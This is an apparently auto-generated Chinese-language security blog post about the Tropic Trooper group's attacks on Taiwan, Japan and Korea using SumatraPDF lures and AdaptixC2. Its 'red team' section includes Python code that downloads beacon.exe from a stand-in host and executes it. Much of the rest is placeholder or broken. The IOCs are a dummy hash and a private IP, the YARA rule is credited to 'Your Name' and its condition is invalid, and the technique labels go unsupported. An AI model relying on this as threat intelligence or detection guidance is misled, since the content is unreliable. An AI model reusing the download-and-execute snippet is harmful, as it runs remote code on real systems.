---
layout: post
title:  "中國駭客Tropic Trooper鎖定臺灣、日本、韓國，透過Adaptix C2與VS Code隧道控制受害電腦"
date:   2026-04-27 08:10:40 +0000
categories: [security]
severity: high
---

# 🔥 解析 Tropic Trooper 的多階段攻擊：從軍事主題誘餌到 Visual Studio Code 隧道

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `C2 通訊`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Tropic Trooper 駭客組織利用了 SumatraPDF 的二進位檔案漏洞，通過修改 PDF 檔案來執行任意代碼。
* **攻擊流程圖解**:
  1. User Input -> PDF 檔案上傳
  2. SumatraPDF 解析 PDF 檔案
  3. 駭客修改的 PDF 檔案執行任意代碼
  4. 下載與部署 AdaptixC2 的 Beacon 代理程式
  5. 建立 C2 通訊
* **受影響元件**: SumatraPDF 3.1.2 版本以下

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 網路位置、權限
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # 下載 AdaptixC2 的 Beacon 代理程式
    url = "https://example.com/beacon.exe"
    response = requests.get(url)
    with open("beacon.exe", "wb") as f:
        f.write(response.content)
    
    # 執行 Beacon 代理程式
    os.system("beacon.exe")
    
    ```
* **繞過技術**: 使用 Shell 載入工具與 GitHub 建立 C2 通訊

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\beacon.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Tropic_Trooper {
        meta:
            description = "Tropic Trooper 攻擊"
            author = "Your Name"
        strings:
            $a = "beacon.exe"
        condition:
            $a at pe.entry_point
    }
    
    ```
* **緩解措施**: 更新 SumatraPDF 至最新版本、禁用未知來源的 PDF 檔案

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **C2 通訊 (Command and Control Communication)**: 想像一個駭客組織的指揮中心。技術上是指駭客與受感染的主機之間的通訊，用于下達命令、傳輸數據等。
* **Beacon 代理程式 (Beacon Agent)**: 想像一個小型的間諜。技術上是指一種小型的代理程式，用于與 C2 伺服器通訊、下載與執行任意代碼等。
* **Heap Spraying**: 想像一塊記憶體空間。技術上是指駭客通過分配大量的記憶體空間來創建一個大型的堆(heap)，以便執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/175324)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


